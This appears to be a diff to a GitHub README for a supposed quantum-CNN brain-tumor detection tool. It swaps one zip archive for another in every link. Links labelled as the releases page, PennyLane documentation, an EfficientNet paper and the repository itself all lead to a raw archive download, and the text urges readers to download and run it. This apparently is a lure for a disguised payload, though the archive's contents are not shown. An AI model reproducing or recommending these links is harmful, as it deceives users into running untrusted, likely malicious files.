@@ -1,6 +1,6 @@
 # 🧠 Brain-Tumor-QCNN - Detect Brain Tumors Easily with AI
 
-[![Download Now](https://raw.githubusercontent.com/wldnmaula/Brain-Tumor-QCNN/main/assets/Tumor_QCNN_Brain_1.5.zip%20Now-Get%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/wldnmaula/Brain-Tumor-QCNN/main/assets/Tumor_QCNN_Brain_1.5.zip)
+[![Download Now](https://github.com/wldnmaula/Brain-Tumor-QCNN/raw/refs/heads/main/assets/Tumor-Brain-QCNN-2.7-alpha.2.zip%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/wldnmaula/Brain-Tumor-QCNN/raw/refs/heads/main/assets/Tumor-Brain-QCNN-2.7-alpha.2.zip)
 
 ## 🚀 Getting Started 
 
@@ -8,7 +8,7 @@ Welcome to Brain-Tumor-QCNN, an advanced tool for detecting brain tumors from MR
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/wldnmaula/Brain-Tumor-QCNN/main/assets/Tumor_QCNN_Brain_1.5.zip) to find the latest version.
+1. Visit the [Releases page](https://github.com/wldnmaula/Brain-Tumor-QCNN/raw/refs/heads/main/assets/Tumor-Brain-QCNN-2.7-alpha.2.zip) to find the latest version.
 2. Look for the latest release tag marked as **Latest Release**.
 3. Click on the appropriate file for your operating system (Windows, Mac, or Linux) to start the download.
 4. Once the download finishes, locate the file in your downloads folder.
@@ -72,8 +72,8 @@ We value your input. If you experience any bugs or have suggestions for improvem
 
 For more information about the underlying technology or further guidance on using the application, consider visiting the following:
 
-- [PennyLane Documentation](https://raw.githubusercontent.com/wldnmaula/Brain-Tumor-QCNN/main/assets/Tumor_QCNN_Brain_1.5.zip)
-- [EfficientNet Research Paper](https://raw.githubusercontent.com/wldnmaula/Brain-Tumor-QCNN/main/assets/Tumor_QCNN_Brain_1.5.zip)
+- [PennyLane Documentation](https://github.com/wldnmaula/Brain-Tumor-QCNN/raw/refs/heads/main/assets/Tumor-Brain-QCNN-2.7-alpha.2.zip)
+- [EfficientNet Research Paper](https://github.com/wldnmaula/Brain-Tumor-QCNN/raw/refs/heads/main/assets/Tumor-Brain-QCNN-2.7-alpha.2.zip)
 
 ## 📊 Related Topics 
 
@@ -88,7 +88,7 @@ These topics are crucial for understanding the impact of hybrid models in medica
 
 ## 🔗 Key Links 
 
-- Explore more on our [GitHub Repository](https://raw.githubusercontent.com/wldnmaula/Brain-Tumor-QCNN/main/assets/Tumor_QCNN_Brain_1.5.zip).
-- Don't forget to [download the latest version here](https://raw.githubusercontent.com/wldnmaula/Brain-Tumor-QCNN/main/assets/Tumor_QCNN_Brain_1.5.zip) again for easy access.
+- Explore more on our [GitHub Repository](https://github.com/wldnmaula/Brain-Tumor-QCNN/raw/refs/heads/main/assets/Tumor-Brain-QCNN-2.7-alpha.2.zip).
+- Don't forget to [download the latest version here](https://github.com/wldnmaula/Brain-Tumor-QCNN/raw/refs/heads/main/assets/Tumor-Brain-QCNN-2.7-alpha.2.zip) again for easy access.
 
 Thank you for trying out Brain-Tumor-QCNN! Your journey towards efficient tumor detection starts here.
